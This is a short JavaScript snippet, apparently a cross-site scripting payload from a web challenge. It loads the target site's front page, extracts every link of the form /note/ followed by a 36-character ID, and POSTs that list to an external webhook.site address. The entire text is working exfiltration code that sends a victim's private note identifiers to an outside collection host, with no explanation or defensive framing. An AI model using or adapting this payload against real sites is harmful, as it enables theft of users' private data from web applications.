fetch('/')
  .then(r => r.text())
  .then(t => {
    const ids = [...t.matchAll(/\/note\/[a-f0-9-]{36}/g)].map(x => x[0]);
    fetch('	https://webhook.site/908900bb-d52c-46dc-9ea4-6822f98b8c5e', {
      method: 'POST',
      body: JSON.stringify(ids)
    });
  });
